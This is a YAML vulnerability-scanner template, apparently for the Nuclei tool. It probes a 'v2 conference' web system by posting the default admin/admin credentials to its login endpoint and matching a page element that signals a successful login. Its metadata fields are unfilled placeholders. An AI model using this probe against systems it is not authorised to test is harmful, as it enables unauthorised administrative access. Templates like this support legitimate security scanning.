id: v2-conference-default-login
info:
  name: Template Name
  author: wangzong
  severity: high
  description: description
  reference:
    - https://
  tags: tags
http:
  - raw:
      - |-
        POST /Conf/jsp/user/loginAction.do HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 75
        Cache-Control: max-age=0
        Upgrade-Insecure-Requests: 1
        Origin: http://{{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Referer: http://{{Hostname}}/Conf/jsp/conference/currentConfAction.do?flag=mastermain&page=
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9
        Cookie: JSESSIONID=304D85BF39405522A4C2B38C44665A4A
        Connection: close

        username=admin&userpass=admin&Submit292=%E7%99%BB%E5%BD%95&logintype=master
    matchers:
      - type: word
        part: body
        words:
          - usermeun.js
